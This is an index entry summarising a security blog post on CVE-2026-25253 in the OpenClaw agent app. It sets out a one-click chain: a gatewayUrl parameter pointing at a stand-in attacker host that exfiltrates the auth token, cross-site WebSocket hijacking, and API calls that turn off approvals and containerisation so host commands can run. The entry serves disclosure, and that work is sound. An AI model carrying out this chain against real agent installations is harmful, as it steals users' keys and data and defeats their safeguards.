---
title: 1-Click RCE To Steal Your OpenClaw Data and Keys (CVE-2026-25253) | depthfirst
category: ai/rag
source_type: web
source_name: Web Discovery
source_url: https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys
published_at: '2026-06-23T01:18:50.360906+05:30'
collected_at: '2026-06-23T01:18:50.360919+05:30'
tags:
- agents
- rag
- web-crawled
status: active
resource_id: blog:1-click-rce-to-steal-your-openclaw-data-and-keys-c
first_seen: '2026-06-23T01:18:50.360919+05:30'
last_seen: '2026-06-23T01:18:50.360919+05:30'
last_checked: '2026-06-23T01:18:50.360919+05:30'
health_score: 100
---

# 1-Click RCE To Steal Your OpenClaw Data and Keys (CVE-2026-25253) | depthfirst

## Summary

- **Unvalidated Gateway URL Injection**: OpenClaw's `app-settings.ts` blindly accepted and persisted a `gatewayUrl` query parameter from URLs (e.g., `https://localhost?gatewayUrl=attacker.com`), enabling arbitrary WebSocket endpoint redirection and token exfiltration.

- **Cross-Site WebSocket Hijacking (CSWSH)**: OpenClaw's WebSocket server failed to validate the `origin` header, allowing attackers to bypass localhost restrictions via malicious JavaScript on a victim's browser, enabling unauthorized access to local instances.

- **Sandbox Escape via API Abuse**: Stolen auth tokens granted `operator.admin` and `operator.approvals` scopes, enabling API calls to disable user confirmations (`exec.approvals.set`) and containerization (`config.patch`), culminating in direct host command execution via `node.invoke`.

## Why It Matters

General public resource representing technology updates, guides, or tutorials.

## Details

- Source: Web Discovery
- Category: ai/rag
- Published: 2026-06-23T01:18:50.360906+05:30

## Related Tags

- agents
- rag
- web-crawled

## Source

Original source: https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys
